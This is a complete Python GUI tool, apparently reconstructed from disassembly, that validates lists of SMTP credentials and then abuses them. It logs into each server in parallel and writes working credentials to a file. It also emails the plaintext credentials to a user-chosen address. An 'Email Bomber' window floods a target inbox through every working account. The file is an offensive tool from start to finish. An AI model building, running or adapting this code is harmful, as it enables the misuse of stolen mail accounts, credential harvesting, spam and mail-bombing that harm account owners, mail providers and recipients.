import smtplib
import threading
import tkinter as tk
from tkinter import scrolledtext, filedialog
import os
import re
import queue
import socket
from smtplib import SMTPAuthenticationError, SMTPServerDisconnected

# --- Global Variables ---
success_count = 0
failure_count = 0
successful_smtps = set()  # Stores tuples of (host, port, user, password) for successful SMTPs
failed_smtps = set()      # Stores tuples of (host, port, user, password) for failed SMTPs
result_queue = queue.Queue() # Queue to pass results from worker threads to GUI thread
lock = threading.Lock() # Lock for thread-safe access to global counters and sets

# --- Helper Functions (Reconstructed from Disassembly) ---

def read_smtps(file_path):
    """
    Reads SMTP details from a file, trying multiple encodings.
    Each line in the file should be in the format: host|port|user|password
    Returns a list of lists, where each inner list is [host, port, user, password].
    """
    encodings = ['utf-8', 'latin1', 'cp1252']
    valid_smtp_list = []
    for enc in encodings:
        try:
            with open(file_path, 'r', encoding=enc) as file:
                smtp_list = []
                for line in file:
                    smtp_list.append(line.strip().split('|'))
                
                # Filter for lines with exactly 4 parts
                for smtp_info in smtp_list:
                    if len(smtp_info) == 4:
                        valid_smtp_list.append(smtp_info)
            return valid_smtp_list # Return if successful with any encoding
        except UnicodeDecodeError:
            # Try next encoding
            continue
        except Exception as e:
            print(f"Error reading file with encoding {enc}: {e}")
            continue
    raise Exception('Could not read file with available encodings')

def clean_port(port):
    """
    Cleans the port string by removing non-digit characters and converting to int.
    Returns 0 if the cleaned port is empty.
    """
    cleaned_port = re.sub(r'\D', '', str(port)) # Ensure port is string for regex
    if cleaned_port:
        return int(cleaned_port)
    return 0

def send_email(smtp_info, test_email, subject, body):
    """
    Attempts to send an email using the provided SMTP details.
    Updates global counters and logs results.
    """
    global success_count, failure_count, successful_smtps, failed_smtps, result_queue

    host, port_str, user, password = smtp_info
    port = clean_port(port_str)

    # Construct the email message
    msg = f"Subject: {subject}\n\n{body}\n\nSMTP details: {host}|{port}|{user}|{password}"

    result = "" # Initialize result string

    try:
        server = None
        if port == 25 or port == 587:
            server = smtplib.SMTP(host, port)
            server.ehlo()
            if port == 587:
                if server.has_extn('STARTTLS'):
                    server.starttls()
                else:
                    raise Exception('STARTTLS extension not supported by server.')
        elif port == 465:
            server = smtplib.SMTP_SSL(host, port)
        else:
            # Fallback for other ports, try as plain SMTP
            server = smtplib.SMTP(host, port)

        server.login(user, password)
        server.sendmail(user, test_email, msg)
        server.quit()

        result = f"Success: {host}|{port}|{user}|{password}"
        with lock:
            success_count += 1
            successful_smtps.add(tuple(smtp_info)) # Add original info as tuple
        
        try:
            with open('successful_smtps.txt', 'a', encoding='utf-8') as success_file:
                success_file.write(f"{'|'.join(smtp_info)}\n")
        except PermissionError as e:
            result += f" - PermissionError: Could not write to successful_smtps.txt: {e}"
            with open('logs.txt', 'a', encoding='utf-8') as log_file:
                log_file.write(f"{result}\n")

    except SMTPAuthenticationError:
        result = f"Failed: {host}|{port}|{user}|{password} - Error: Authentication failed."
        with lock:
            failure_count += 1
            failed_smtps.add(tuple(smtp_info))
        with open('logs.txt', 'a', encoding='utf-8') as log_file:
            log_file.write(f"{result}\n")
    except SMTPServerDisconnected:
        result = f"Failed: {host}|{port}|{user}|{password} - Error: Server disconnected."
        with lock:
            failure_count += 1
            failed_smtps.add(tuple(smtp_info))
        with open('logs.txt', 'a', encoding='utf-8') as log_file:
            log_file.write(f"{result}\n")
    except socket.gaierror:
        result = f"Failed: {host}|{port}|{user}|{password} - Error: Address-related error."
        with lock:
            failure_count += 1
            failed_smtps.add(tuple(smtp_info))
        with open('logs.txt', 'a', encoding='utf-8') as log_file:
            log_file.write(f"{result}\n")
    except Exception as e:
        result = f"Failed: {host}|{port}|{user}|{password} - Error: {e}"
        with lock:
            failure_count += 1
            failed_smtps.add(tuple(smtp_info))
        
        try:
            with open('logs.txt', 'a', encoding='utf-8') as log_file:
                log_file.write(f"{result}\n")
        except PermissionError as perm_e:
            result += f" - PermissionError: Could not write to logs.txt: {perm_e}"
            # This error itself cannot be logged to the file, so print to console
            print(result) 
    finally:
        result_queue.put(result) # Always put result in queue for GUI update

# --- GUI Logic Functions ---

def start_smtp_check(smtps_to_check):
    """
    Starts multiple threads to send emails for each SMTP entry.
    """
    test_email = email_entry.get()
    subject = "SMTP Test"
    body = "This is a test email from your SMTP checker."

    if not test_email:
        results_text.insert(tk.END, "Please enter a test email address.\n")
        return

    results_text.insert(tk.END, f"Starting SMTP check for {len(smtps_to_check)} entries...\n")
    results_text.config(state=tk.DISABLED)
    
    global success_count, failure_count
    with lock:
        success_count = 0
        failure_count = 0
        successful_smtps.clear()
        failed_smtps.clear()
    
    update_counters()

    for smtp_info in smtps_to_check:
        thread = threading.Thread(target=send_email, args=(smtp_info, test_email, subject, body))
        thread.daemon = True # Allow program to exit even if threads are running
        thread.start()

def retry_failed_smtps():
    """
    Retries checking the SMTPs that failed in the previous run.
    """
    global failed_smtps
    if not failed_smtps:
        results_text.insert(tk.END, "No failed SMTPs to retry.\n")
        return
    
    results_text.insert(tk.END, f"Retrying {len(failed_smtps)} failed SMTPs...\n")
    
    # Convert set to list for iteration and clear the set for new attempts
    smtps_to_retry = list(failed_smtps)
    failed_smtps.clear() # Clear failed_smtps before retrying
    
    start_smtp_check(smtps_to_retry)


def save_failed_smtps():
    """
    Saves the list of failed SMTPs to a file.
    """
    global failed_smtps
    if not failed_smtps:
        results_text.insert(tk.END, "No failed SMTPs to save.\n")
        return

    save_path = filedialog.asksaveasfilename(
        defaultextension=".txt",
        filetypes=[("Text files", "*.txt"), ("All files", "*.*")],
        title="Save Failed SMTPs"
    )
    if save_path:
        try:
            with open(save_path, 'w', encoding='utf-8') as f:
                for smtp_info_tuple in failed_smtps:
                    f.write(f"{'|'.join(smtp_info_tuple)}\n")
            results_text.insert(tk.END, f"Failed SMTPs saved to: {save_path}\n")
        except Exception as e:
            results_text.insert(tk.END, f"Error saving failed SMTPs: {e}\n")
    results_text.config(state=tk.DISABLED)


def send_multiple_emails(test_email, num_emails, subject, body):
    """
    Sends multiple emails using the successful SMTPs.
    This function is intended to be called by the 'bomber' window's worker thread.
    """
    global successful_smtps, result_queue

    if not successful_smtps:
        result_queue.put("No successful SMTPs to use for bombing. Please run a check first.")
        return

    threads = []
    result_queue.put(f"Starting to send {num_emails} emails using {len(successful_smtps)} successful SMTPs...\n")

    # Iterate num_emails times, and for each iteration, iterate through successful SMTPs
    for i in range(num_emails):
        for smtp_info in list(successful_smtps): # Iterate over a copy to avoid issues if set changes during iteration
            # Create a thread for each email to be sent
            thread = threading.Thread(target=send_email, args=(smtp_info, test_email, subject, body))
            thread.daemon = True # Allow program to exit even if threads are running
            threads.append(thread)
            thread.start()

    # Wait for all threads to complete their current tasks
    for thread in threads:
        thread.join()
    
    result_queue.put("All bomber emails sent (or attempted).")


def display_result():
    """
    Continuously checks the result_queue and updates the GUI with results.
    """
    while not result_queue.empty():
        result = result_queue.get()
        results_text.config(state=tk.NORMAL)
        results_text.insert(tk.END, result + "\n")
        results_text.see(tk.END) # Scroll to the end
        results_text.config(state=tk.DISABLED)
    
    # Schedule itself to run again after a short delay
    root.after(100, display_result)

def update_counters():
    """
    Updates the success and failure labels in the GUI.
    """
    with lock:
        success_label.config(text=f"Success: {success_count}")
        failure_label.config(text=f"Failure: {failure_count}")
    
    # Schedule itself to run again after a short delay
    root.after(100, update_counters)

def browse_file():
    """
    Opens a file dialog to select the SMTP list file.
    """
    file_path = filedialog.askopenfilename(
        filetypes=[("Text files", "*.txt"), ("All files", "*.*")]
    )
    if file_path:
        file_entry.delete(0, tk.END)
        file_entry.insert(0, file_path)

def start_check():
    """
    Initiates the SMTP checking process.
    """
    file_path = file_entry.get()
    if not file_path or not os.path.exists(file_path):
        results_text.config(state=tk.NORMAL)
        results_text.insert(tk.END, "Please select a valid SMTP list file.\n")
        results_text.config(state=tk.DISABLED)
        return

    try:
        smtps_to_check = read_smtps(file_path)
        if not smtps_to_check:
            results_text.config(state=tk.NORMAL)
            results_text.insert(tk.END, "No valid SMTP entries found in the file.\n")
            results_text.config(state=tk.DISABLED)
            return
        start_smtp_check(smtps_to_check)
    except Exception as e:
        results_text.config(state=tk.NORMAL)
        results_text.insert(tk.END, f"Error reading SMTP file: {e}\n")
        results_text.config(state=tk.DISABLED)

def start_smtp_check_worker(smtps_to_check):
    """
    Worker function to run the SMTP check in a separate thread.
    """
    test_email = email_entry.get()
    subject = "SMTP Test"
    body = "This is a test email from your SMTP checker."

    if not test_email:
        result_queue.put("Please enter a test email address.")
        return

    result_queue.put(f"Starting SMTP check for {len(smtps_to_check)} entries...\n")
    
    global success_count, failure_count
    with lock:
        success_count = 0
        failure_count = 0
        successful_smtps.clear()
        failed_smtps.clear()
    
    # Threads will update counters and results via the queue
    threads = []
    for smtp_info in smtps_to_check:
        thread = threading.Thread(target=send_email, args=(smtp_info, test_email, subject, body))
        thread.daemon = True # Allow program to exit even if threads are running
        threads.append(thread)
        thread.start()

    # Wait for all threads to complete for this batch
    for thread in threads:
        thread.join()
    
    result_queue.put("SMTP check completed.")


def retry_failed_smtps_worker():
    """
    Worker function to retry checking the SMTPs that failed in the previous run.
    """
    global failed_smtps
    if not failed_smtps:
        result_queue.put("No failed SMTPs to retry.")
        return
    
    result_queue.put(f"Retrying {len(failed_smtps)} failed SMTPs...\n")
    
    # Convert set to list for iteration and clear the set for new attempts
    smtps_to_retry = list(failed_smtps)
    with lock:
        failed_smtps.clear() # Clear failed_smtps before retrying
        # Note: success_count and failure_count are managed by send_email,
        # so we don't reset them here, but rather let individual send_email calls update.
    
    start_smtp_check_worker(smtps_to_retry)
    
def retry_failed():
    """
    Wrapper function for the retry button, starts in a separate thread.
    """
    # Start the retry process in a new thread to keep GUI responsive
    thread = threading.Thread(target=retry_failed_smtps_worker)
    thread.daemon = True
    thread.start()


def open_bomber():
    """
    Opens a new Toplevel window for the Email Bomber functionality.
    """
    bomber_window = tk.Toplevel(root)
    bomber_window.title("Email Bomber")
    bomber_window.geometry("400x350") # Adjusted geometry for more space
    bomber_window.configure(bg="#2E2E2E")
    bomber_window.transient(root) # Make it appear on top of the main window
    bomber_window.grab_set() # Make it modal

    # Title Label
    title_label = tk.Label(bomber_window, text="Email Bomber", font=("Arial", 18, "bold"), fg="#FFFFFF", bg="#2E2E2E")
    title_label.pack(pady=10)

    # Frame for inputs
    frame = tk.Frame(bomber_window, bg="#2E2E2E")
    frame.pack(pady=10)

    # Test Email Entry
    tk.Label(frame, text="Test Email To:", fg="#FFFFFF", bg="#2E2E2E", font=("Inter", 10)).grid(row=0, column=0, padx=5, pady=5, sticky="e")
    email_entry_bomber = tk.Entry(frame, width=30, bg="#505050", fg="#FFFFFF", insertbackground="#FFFFFF", bd=1, relief="solid", font=("Inter", 10))
    email_entry_bomber.grid(row=0, column=1, padx=5, pady=5)
    email_entry_bomber.insert(0, email_entry.get()) # Pre-fill with main window's test email

    # Number of Emails Entry
    tk.Label(frame, text="Number of Emails:", fg="#FFFFFF", bg="#2E2E2E", font=("Inter", 10)).grid(row=1, column=0, padx=5, pady=5, sticky="e")
    num_emails_entry = tk.Entry(frame, width=10, bg="#505050", fg="#FFFFFF", insertbackground="#FFFFFF", bd=1, relief="solid", font=("Inter", 10))
    num_emails_entry.grid(row=1, column=1, padx=5, pady=5, sticky="w")
    num_emails_entry.insert(0, "1") # Default to 1 email

    # Subject Entry
    tk.Label(frame, text="Subject:", fg="#FFFFFF", bg="#2E2E2E", font=("Inter", 10)).grid(row=2, column=0, padx=5, pady=5, sticky="e")
    subject_entry = tk.Entry(frame, width=30, bg="#505050", fg="#FFFFFF", insertbackground="#FFFFFF", bd=1, relief="solid", font=("Inter", 10))
    subject_entry.grid(row=2, column=1, padx=5, pady=5)
    subject_entry.insert(0, "Mass Email Test")

    # Body Text Area
    tk.Label(frame, text="Body:", fg="#FFFFFF", bg="#2E2E2E", font=("Inter", 10)).grid(row=3, column=0, padx=5, pady=5, sticky="ne")
    body_entry = tk.Text(frame, height=5, width=30, bg="#505050", fg="#FFFFFF", insertbackground="#FFFFFF", bd=1, relief="solid", font=("Inter", 10))
    body_entry.grid(row=3, column=1, padx=5, pady=5)
    body_entry.insert(tk.END, "This is a mass email test from the SMTP Checker.")

    def send_emails_bomber_internal():
        """
        Internal function to gather data from bomber GUI and start the sending process.
        This function runs in the main GUI thread, but it spawns a new thread
        for the actual email sending to keep the GUI responsive.
        """
        test_email_val = email_entry_bomber.get()
        subject_val = subject_entry.get()
        body_val = body_entry.get("1.0", tk.END).strip()

        try:
            num_emails_val = int(num_emails_entry.get())
            if num_emails_val <= 0:
                raise ValueError("Number of emails must be positive.")
        except ValueError:
            result_queue.put("Invalid number of emails. Please enter a positive whole number.")
            return

        if not test_email_val:
            result_queue.put("Please enter a test email address for the bomber.")
            return
        
        if not successful_smtps:
            result_queue.put("No successful SMTPs available to send emails. Please run a check first.")
            return

        # Start the actual send_multiple_emails in a new thread
        thread = threading.Thread(target=send_multiple_emails, args=(test_email_val, num_emails_val, subject_val, body_val))
        thread.daemon = True
        thread.start()
        bomber_window.destroy() # Close the bomber window after starting the process
        root.grab_release() # Release the grab on the main window

    # Send Emails Button
    send_button = tk.Button(bomber_window, text="Send Emails", command=send_emails_bomber_internal, bg="#4CAF50", fg="#FFFFFF", font=("Inter", 10, "bold"), bd=0, relief="raised", padx=15, pady=8)
    send_button.pack(pady=10)

    # Set focus to the new window and wait for it to close
    bomber_window.wait_window()


# --- GUI Setup ---

root = tk.Tk()
root.title("SMTP Checker GUI")
root.geometry("800x600")
root.configure(bg="#2E2E2E") # Dark background

# Main Frame
main_frame = tk.Frame(root, bg="#3C3C3C", padx=10, pady=10, bd=2, relief="groove")
main_frame.pack(pady=20, padx=20, fill="both", expand=True)

# File selection
file_label = tk.Label(main_frame, text="SMTP List File:", bg="#3C3C3C", fg="#FFFFFF", font=("Inter", 10, "bold"))
file_label.grid(row=0, column=0, sticky="w", pady=5, padx=5)

file_entry = tk.Entry(main_frame, width=50, bg="#505050", fg="#FFFFFF", insertbackground="#FFFFFF", bd=1, relief="solid", font=("Inter", 10))
file_entry.grid(row=0, column=1, pady=5, padx=5, sticky="ew")

browse_button = tk.Button(main_frame, text="Browse", command=browse_file, bg="#007ACC", fg="#FFFFFF", font=("Inter", 10, "bold"), bd=0, relief="raised", padx=10, pady=5)
browse_button.grid(row=0, column=2, pady=5, padx=5)

# Test Email Entry
email_label = tk.Label(main_frame, text="Test Email To:", bg="#3C3C3C", fg="#FFFFFF", font=("Inter", 10, "bold"))
email_label.grid(row=1, column=0, sticky="w", pady=5, padx=5)

email_entry = tk.Entry(main_frame, width=50, bg="#505050", fg="#FFFFFF", insertbackground="#FFFFFF", bd=1, relief="solid", font=("Inter", 10))
email_entry.grid(row=1, column=1, pady=5, padx=5, sticky="ew")
email_entry.insert(0, "test@example.com") # Default test email

# Buttons Frame
button_frame = tk.Frame(main_frame, bg="#3C3C3C")
button_frame.grid(row=2, column=0, columnspan=3, pady=10)

start_button = tk.Button(button_frame, text="Start Check", command=start_check, bg="#4CAF50", fg="#FFFFFF", font=("Inter", 10, "bold"), bd=0, relief="raised", padx=15, pady=8)
start_button.pack(side=tk.LEFT, padx=5)

retry_button = tk.Button(button_frame, text="Retry Failed", command=retry_failed, bg="#FFC107", fg="#333333", font=("Inter", 10, "bold"), bd=0, relief="raised", padx=15, pady=8)
retry_button.pack(side=tk.LEFT, padx=5)

save_failed_button = tk.Button(button_frame, text="Save Failed", command=save_failed_smtps, bg="#F44336", fg="#FFFFFF", font=("Inter", 10, "bold"), bd=0, relief="raised", padx=15, pady=8)
save_failed_button.pack(side=tk.LEFT, padx=5)

bomber_button = tk.Button(button_frame, text="Open Bomber", command=open_bomber, bg="#9C27B0", fg="#FFFFFF", font=("Inter", 10, "bold"), bd=0, relief="raised", padx=15, pady=8)
bomber_button.pack(side=tk.LEFT, padx=5)

# Results Text Area
results_text = scrolledtext.ScrolledText(main_frame, wrap=tk.WORD, state=tk.DISABLED, bg="#1E1E1E", fg="#00FF00", font=("Consolas", 9), bd=1, relief="solid")
results_text.grid(row=3, column=0, columnspan=3, pady=10, padx=5, sticky="nsew")
main_frame.grid_rowconfigure(3, weight=1)
main_frame.grid_columnconfigure(1, weight=1) # Allow file_entry to expand

# Counters Frame
counter_frame = tk.Frame(main_frame, bg="#3C3C3C")
counter_frame.grid(row=4, column=0, columnspan=3, pady=5)

success_label = tk.Label(counter_frame, text=f"Success: {success_count}", bg="#3C3C3C", fg="#4CAF50", font=("Inter", 10, "bold"))
success_label.pack(side=tk.LEFT, padx=10)

failure_label = tk.Label(counter_frame, text=f"Failure: {failure_count}", bg="#3C3C3C", fg="#F44336", font=("Inter", 10, "bold"))
failure_label.pack(side=tk.LEFT, padx=10)

# Start periodic updates for results and counters
root.after(100, display_result)
root.after(100, update_counters)

# Start the Tkinter event loop
root.mainloop()
